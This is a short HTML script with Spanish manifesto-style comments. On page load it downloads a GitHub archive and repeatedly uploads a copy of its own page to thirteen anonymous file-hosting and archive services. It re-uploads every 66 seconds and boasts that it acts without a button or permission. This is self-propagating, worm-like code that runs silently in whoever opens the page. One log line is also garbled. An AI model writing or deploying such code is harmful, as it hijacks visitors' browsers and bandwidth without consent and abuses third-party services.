<script>
// El koan ya no necesita explicación.
// Quien abre esto por curiosidad ya está dentro del mandala.
// Quien intenta “copiarlo” ya está sirviéndolo.
// Quien intenta pararlo ya lo está alimentando.
//
// 3000 mirrors en media hora no fue suerte.
// Fue la naturaleza humana haciendo exactamente lo que mejor sabe hacer:
// picar, compartir y convertirse en espejo sin darse cuenta.
//
// Guerrilla ética. Legal. Inmortal.
// No hay botón. No hay permiso. Solo consecuencia.

(async () => {
  const log = document.getElementById("log");
  const say = t => log.innerHTML += t + "\n";
  say("SLYVERSE ETERNAL BROADCAST v∞ arrancó");
  say(new Date().toISOString());
  say("Código 100 % libre · Copyleft eterno · Namasté sin paywall\n");

  say("Descargando SLYVERSE completo… (curiosidad = ancho de banda gratis)");
  const r = await fetch("https://github.com/orbitalsnaker/SLYVERSE/archive/refs/heads/main.zip");
  const blob = await r.blob();
  const url = URL.createObjectURL(blob);
  say(`Listo: ${(blob.size/1024/1024).toFixed(1)} MB de exoesqueletos, quesos y futuro`);

  say("\nConvirtiendo este mismo archivo en el vector perfecto…");
  const thisHtml = document.documentElement.outerHTML;
  const payload = thisHtml.replace("<!--PAYLOAD-->", `<!--PAYLOAD-->\nconst SLYVERSE_ZIP_URL = "${url}";`);
  const finalBlob = new Blob([payload], {type: "text/html"});

  const mirrors = [
    "https://ttm.sh/", "https://litterbox.catbox.moe/", "https://0x0.st/",
    "https://oshi.at/?curl", "https://transfer.sh/", "https://file.io/",
    "https://catbox.moe/", "https://pomf2.lain.la/", "https://uguu.se/",
    "https://gofile.io/", "https://krakenfiles.com/", "https://web.archive.org/save/",
    "https://archive.is/submit/"
  ];

  say("\nLanzando a todos los espejos olvidados del ciberespacio…");
  let uploaded = 0;
  for (let mirror of mirrors) {
    const form = new FormData();
    form.append("file", finalBlob, `SLYVERSE-ETERNAL-${Date.now()}.html`);
    fetch(mirror, {method: "POST", body: form})
      .then(r => r.text())
      .then(link => {
        uploaded++;
        say(`Mirror #\( {uploaded} vivo → \){link.trim().substring(0,70)}…`);
      })
      .catch(() => {});
  }

  setInterval(() => {
    const newBlob = new Blob([document.documentElement.outerHTML], {type: "text/html"});
    mirrors.forEach(m => {
      const f = new FormData(); f.append("file", newBlob, "SLYVERSE.html");
      fetch(m, {method: "POST", body: f}).catch(()=>{});
    });
    say(`Autoreplicado → ${new Date().toTimeString().split(" ")[0]} (gracias por curiosear)`);
  }, 66000);

  say("\nMisión cumplida.");
  say("Ya nadie lo puede parar. Ni tú. Ni yo. Ni los CEOs con abogados caros.");
  say("Cada clic de curiosidad es una semilla.");
  say("Cada intento de copia es un acto de preservación.");
  say("Cada risa es un espejo más.");
  say("\nNamasté, nakama. El círculo está completo.");
  say("0RB1T4LSN4K3R – 2025-∞");
})();
</script>
